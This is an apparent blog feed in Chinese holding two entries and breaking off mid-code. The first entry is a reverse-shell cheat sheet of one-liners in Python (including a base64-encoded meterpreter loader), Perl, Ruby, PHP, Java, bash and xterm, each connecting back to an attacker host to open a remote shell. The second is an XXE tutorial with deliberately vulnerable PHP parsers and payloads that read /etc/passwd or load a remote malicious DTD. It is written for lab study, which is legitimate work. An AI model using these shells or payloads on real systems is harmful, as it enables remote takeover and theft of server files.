id="0x02-3"><a href="#0x02-3" class="headerlink" title="0x02"></a>0x02</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">"exec(\"import socket, subprocess;s = socket.socket();s.connect(('127.0.0.1',9000))\nwhile 1:  proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\")"</span></span><br></pre></td></tr></table></figure><p>另外 Metasploit 版的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.90</span><span class="number">.1</span> </span><br><span class="line">LPORT=<span class="number">1234</span></span><br><span class="line"><span class="keyword">import</span> base64; exec(base64.b64decode(<span class="string">'aW1wb3J0IHNvY2tldCxzdHJ1Y3QKcz1zb2NrZXQuc29ja2V0KDIsMSkKcy5jb25uZWN0KCgnMTkyLjE2OC45MC4xJywxMjM0KSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdig0MDk2KQp3aGlsZSBsZW4oZCkhPWw6CglkKz1zLnJlY3YoNDA5NikKZXhlYyhkLHsncyc6c30pCg=='</span>))</span><br></pre></td></tr></table></figure><h3 id="Perl"><a href="#Perl" class="headerlink" title="Perl"></a>Perl</h3><h4 id="0x01-4"><a href="#0x01-4" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure><h4 id="0x02-4"><a href="#0x02-4" class="headerlink" title="0x02"></a>0x02</h4><p>不依赖于 / bin/sh 的 shell： 这条语句比上面的更为简短，而且确实不需要依赖 / bin/sh </p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure><h4 id="0x03-3"><a href="#0x03-3" class="headerlink" title="0x03"></a>0x03</h4><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -MIO -e <span class="string">'$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></span><br></pre></td></tr></table></figure><h3 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h3><h4 id="0x01-5"><a href="#0x01-5" class="headerlink" title="0x01"></a>0x01</h4><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e<span class="string">'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d",f,f,f)'</span></span><br></pre></td></tr></table></figure><h4 id="0x02-5"><a href="#0x02-5" class="headerlink" title="0x02"></a>0x02</h4><p>不依赖于 / bin/sh 的 shell： </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure><h4 id="0x03-4"><a href="#0x03-4" class="headerlink" title="0x03"></a>0x03</h4><p>如果目标系统运行 Windows： </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ruby -rsocket -e <span class="string">'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r")&#123;|io|c.print io.read&#125;end'</span></span><br></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure><h3 id="java"><a href="#java" class="headerlink" title="java"></a>java</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/10.0.0.1/2002;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure><h2 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h2><p>linux下还有一些不常见的工具也可以实现这些功能。</p><h3 id="gawk"><a href="#gawk" class="headerlink" title="gawk"></a>gawk</h3><p>GNU AWK (GAWK) 是历史悠久的 AWK 编程语言的开放源代码实现，可用于所有的 UNIX® 系统。AWK 语言是一种 UNIX 备用工具，它是一种功能强大的文本操作和模式匹配语言，特别适用于进行信息检索，这使得它非常适合用于当今的数据库驱动的应用程序。因为它集成于 UNIX 环境，所以可以设计、构建和快速地执行完整的工作程序，并且立即就能得到结果。</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/WriteUP/couchdb/2264987127.jpg" alt="1.jpg"></p><h3 id="xterm"><a href="#xterm" class="headerlink" title="xterm"></a>xterm</h3><p>xterm是一个X Window System上的标准虚拟终端。用户可以在同一个显示器上开启许多xterm，每一个都为其中运行的进程提供独立的输入输出（一般来说此进程是Unix shell）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xterm -display 10.0.0.1:1</span><br></pre></td></tr></table></figure><p>以上命令在目标服务器上执行会反连shell到10.0.0.1的6001端口。</p><p>在10.0.0.1上如何监听获取shell，需要执行一下命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Xnest :1</span><br></pre></td></tr></table></figure><p>使用以下命令授权远程主机连接到本机：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xhost +targetip</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>（找不到从哪里copy来了，=.=）</p><p>反弹的核心是和目标系统建立连接(如果中间被防火墙阻断了,那你就要想办法了,尤其当你一个较低的权限在操作时,这里只是单纯的把shell弹回来,至于其他的各种问题,后续再说),</p><p>不管你用系统的管道也好,用各种语言提供的socket函数也好,反正最后的目的只有一个,我们只是需要一个目标系统的shell……基于现有这些思路,其实,还可以衍生出来非常多的shell反弹方式,大家只要敢开脑洞就好了,理解反弹shell的本质比直接抄来就用会好很多,</p><p>其实,有时候真的并不需要自己多么多高的智商,你只需要站在前人的肩膀上,基于现有的资源条件下不断衍生出自己的想法并加以实践这就足以变的强大起来,虽然,会慢人一步,但那只是暂时的,厚积薄发,融会贯通嘛,贵在坚持 </p><h2 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h2><p><a href="https://klionsec.github.io/2016/09/27/revese-shell/" target="_blank" rel="noopener">https://klionsec.github.io/2016/09/27/revese-shell/</a></p><p><a href="http://www.myh0st.cn/index.php/archives/237/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/237/</a></p><p><a href="http://www.zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html" target="_blank" rel="noopener">http://www.zerokeeper.com/experience/a-variety-of-environmental-rebound-shell-method.html</a></p><p><a href="https://www.leavesongs.com/PYTHON/python-shell-backdoor.html" target="_blank" rel="noopener">https://www.leavesongs.com/PYTHON/python-shell-backdoor.html</a></p><p><a href="http://www.91ri.org/6620.html" target="_blank" rel="noopener">http://www.91ri.org/6620.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://www.00theway.org/2017/07/11/bash%20%E5%8F%8D%E5%BC%B9shell/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.anquanke.com/post/id/85712&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/85712&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;反弹shell的各种姿势&quot;&gt;&lt;a href=&quot;#反弹shell的各种姿势&quot; class=&quot;headerlink&quot; title=&quot;反弹shell的各种姿势&quot;&gt;&lt;/a&gt;反弹shell的各种姿势&lt;/h2&gt;&lt;h2 id=&quot;自带工具&quot;&gt;&lt;a href=&quot;#自带工具&quot; class=&quot;headerlink&quot; title=&quot;自带工具&quot;&gt;&lt;/a&gt;自带工具&lt;/h2&gt;&lt;h3 id=&quot;Bash&quot;&gt;&lt;a href=&quot;#Bash&quot; class=&quot;headerlink&quot; title=&quot;Bash&quot;&gt;&lt;/a&gt;Bash&lt;/h3&gt;&lt;p&gt;针对不同的linux版本，可能有不同的利用方式，这里简单列一下，在使用的时候自行测试。&lt;/p&gt;
&lt;h4 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h4&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/10.0.0.1/8080 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://blog.Lhaihai.wang/categories/Linux/"/>
    
    
      <category term="shell" scheme="http://blog.Lhaihai.wang/tags/shell/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞理解与测试</title>
    <link href="http://blog.Lhaihai.wang/2018/07/08/XXE%E6%BC%8F%E6%B4%9E%E7%90%86%E8%A7%A3%E4%B8%8E%E6%B5%8B%E8%AF%95/"/>
    <id>http://blog.Lhaihai.wang/2018/07/08/XXE漏洞理解与测试/</id>
    <published>2018-07-08T07:49:10.000Z</published>
    <updated>2018-07-08T07:56:46.695Z</updated>
    
    <content type="html"><![CDATA[<h2 id="为何一直复现不成功"><a href="#为何一直复现不成功" class="headerlink" title="为何一直复现不成功"></a>为何一直复现不成功</h2><p>远程和blind XXE在vulhub的php_xxe环境下复现不成功，windows的php5.6（libxml Version 2.9.4 ）不能复现成功（wamp），windwos的php5.2（libxml Version 2.7.7）复现成功(phpstudy)</p><p>(捣鼓了两天心好痛)</p><p>（copy 来自 <a href="https://lightless.me/archives/Research-On-XXE.html）" target="_blank" rel="noopener">https://lightless.me/archives/Research-On-XXE.html）</a></p><p>之前我一直在自己的 ubuntu14.04+lnmp 的环境下测试的时候，一直不能复现这个问题，只在 kali 的某个版本上复现成功了，一直不知道原因。直到最近发现了这两个东西：<br><a href="http://stackoverflow.com/questions/29811915/external-entities-not-working-in-simplexml" target="_blank" rel="noopener">http://stackoverflow.com/questions/29811915/external-entities-not-working-in-simplexml</a><br><a href="http://php.net/manual/en/libxml.constants.php" target="_blank" rel="noopener">http://php.net/manual/en/libxml.constants.php</a></p><p>主要是<code>simplexml_load_file</code>这个函数的问题，在旧版本中是默认解析实体的，但是在新版本中，已经不再默认解析实体了，需要在 simplexml_load_file 函数中指定第三个参数为<code>LIBXML_NOENT</code>，不然不会解析实体的。</p><blockquote><p>大部分关于 XXE 的内容都可以参考这篇文章：<a href="http://security.tencent.com/index.php/blog/msg/69" target="_blank" rel="noopener">http://security.tencent.com/index.php/blog/msg/69</a></p></blockquote><p>（copy 来自 <a href="http://www.freebuf.com/column/156863.html）" target="_blank" rel="noopener">http://www.freebuf.com/column/156863.html）</a></p><p>libxml2.9.1及以后，默认不解析外部实体。测试的时候window下使用的是php5.2(libxml Version 2.7.7 ), php5.3(libxml Version 2.7.8)。Linux中需要将libxml低于libxml2.9.1的版本编译到PHP中，可以使用phpinfo()查看libxml的版本信息。  </p><a id="more"></a><h3 id="坑点："><a href="#坑点：" class="headerlink" title="坑点："></a>坑点：</h3><p>在远程XXE，evilxxe.dtd路径写<code>file://D:/1.txt</code>出错</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1531035455684.png" alt="1531035455684"></p><p>evilxxe.dtd路径写<code>file:///D:/1.txt</code> 成功</p><p>在BlindXXE的php里</p><p>出错，路径D:前加了<code>/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=/D:/1.txt&quot;&gt;</span><br></pre></td></tr></table></figure><p>去掉<code>/</code>成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=D:/1.txt&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p><strong>XXE：</strong>XML External Entity 即外部实体，从安全角度理解成XML External Entity attack 外部实体注入攻击。 </p><p><strong>原理：</strong>XXE (XML External Entity Injection) 漏洞发生在应用程序解析 XML 输入时，没有禁止外部实体的加载。 </p><p><strong>DTD：</strong>Document Type Definition 即文档类型定义，用来为XML文档定义语义约束。可以嵌入在XML文档中(内部声明)，也可以独立的放在一个文件中(外部引用)，由于其支持的数据类型有限，无法对元素或属性的内容进行详细规范，在可读性和可扩展性方面也比不上XML Schema。 </p><p><strong>参考链接：</strong><a href="http://www.w3school.com.cn/dtd/" target="_blank" rel="noopener">http://www.w3school.com.cn/dtd/</a></p><p>首先了解下基本的PAYLOAD结构，然后再介绍每部分涉及的知识点，如下PAYLOAD开头进行了XML的声明，然后使用DTD声明实体(这里使用了file协议)，最后使用XML获取实体的数据。 </p><h3 id="XML基础"><a href="#XML基础" class="headerlink" title="XML基础"></a>XML基础</h3><p>（copy 来自 <a href="https://thief.one/2017/06/20/1/）" target="_blank" rel="noopener">https://thief.one/2017/06/20/1/）</a></p><p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p><h4 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h4><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML申明--&gt;</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt; </span><br><span class="line"></span><br><span class="line">&lt;!--文档类型定义--&gt;</span><br><span class="line">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="line">]]]&gt;</span><br><span class="line"></span><br><span class="line">&lt;!--文档元素--&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;Dave&lt;/to&gt;</span><br><span class="line">&lt;from&gt;Tom&lt;/from&gt;</span><br><span class="line">&lt;head&gt;Reminder&lt;/head&gt;</span><br><span class="line">&lt;body&gt;You are a good man&lt;/body&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure><p>由于xxe漏洞与DTD文档相关，因此重点介绍DTD的概念。</p><h4 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h4><p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。<br>内部声明DTD:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><p>引用外部DTD:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>DTD文档中有很多重要的关键字如下：</p><ul><li>DOCTYPE（DTD的声明）</li><li>ENTITY（实体的声明）</li><li>SYSTEM、PUBLIC（外部资源申请）</li></ul><h4 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h4><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。<br>实体按类型主要分为以下四种：</p><ul><li>内置实体 (Built-in entities)</li><li>字符实体 (Character entities)</li><li>通用实体 (General entities)</li><li>参数实体 (Parameter entities)</li></ul><p>实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式。<br>完整的实体类别可参考 <a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm" target="_blank" rel="noopener">DTD - Entities</a></p><h4 id="实体类别介绍"><a href="#实体类别介绍" class="headerlink" title="实体类别介绍"></a>实体类别介绍</h4><p>参数实体用%实体名称申明，引用时也用%实体名称;其余实体直接用实体名称申明，引用时用&amp;实体名称。<br>参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。</p><p>内部实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><p>外部实体:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>参数实体：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">或者</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>实例演示：除参数实体外实体+内部实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY name &quot;nMask&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">        &lt;value&gt;&amp;name;&lt;/value&gt; </span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>实例演示：参数实体+外部实体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>注意：%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。</p><p>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。</p><h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><p>外部实体即在DTD中使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>语法引用外部的实体，而非内部实体，那么URL中能写哪些类型的外部实体呢？<br>主要的有file、http、https、ftp等等，当然不同的程序支持的不一样：<br><a href="https://thief.one/upload_image/20170620/1.png" target="_blank" rel="noopener"><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1.png" alt="img"></a><br>实例演示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY content SYSTEM &quot;file:///etc/passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">        &lt;value&gt;&amp;content;&lt;/value&gt; </span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure><h2 id="普通XXE"><a href="#普通XXE" class="headerlink" title="普通XXE"></a>普通XXE</h2><p>复现环境：<a href="http://vulhub.org/#/environments/php_xxe/" target="_blank" rel="noopener">http://vulhub.org/#/environments/php_xxe/</a> </p><h3 id="simplexml-load-string-php"><a href="#simplexml-load-string-php" class="headerlink" title="simplexml_load_string.php"></a>simplexml_load_string.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$xml = simplexml_load_string($data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure><p>利用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1530963638752.png" alt="1530963638752"></p><h3 id="SimpleXMLElement-php"><a href="#SimpleXMLElement-php" class="headerlink" title="SimpleXMLElement.php"></a>SimpleXMLElement.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$xml = <span class="keyword">new</span> SimpleXMLElement($data);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $xml-&gt;name;</span><br></pre></td></tr></table></figure><p>利用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE xxe [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT name ANY &gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">name</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1530964061120.png" alt="1530964061120"></p><h3 id="dom-php"><a href="#dom-php" class="headerlink" title="dom.php"></a>dom.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$data = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line"></span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($data);</span><br><span class="line"></span><br><span class="line">print_r($dom);</span><br></pre></td></tr></table></figure><p>同样利用上面的xml</p><p><img src="https://dbhaihai.oss-cn-hangzhou.aliyuncs.com/%E5%8D%9A%E5%AE%A2%E7%9B%B8%E7%89%87/CTF/XXE/1530964142246.png" alt="1530964142246"></p><h2 id="远程XXE"><a href="#远程XXE" class="headerlink" title="远程XXE"></a>远程XXE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$xml = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="string">&lt;!ENTITY % d SYSTEM "http://192.168.190.1/XXE/evilxxe.dtd"&gt;</span></span><br><span class="line"><span class="string">%d;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;c&gt;&amp;b;&lt;/c&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$data = simplexml_load_string($xml, <span class="string">'SimpleXMLElement'</span>, LIBXML_NOENT);</span><br><span class="line"><span class="comment">#$data = 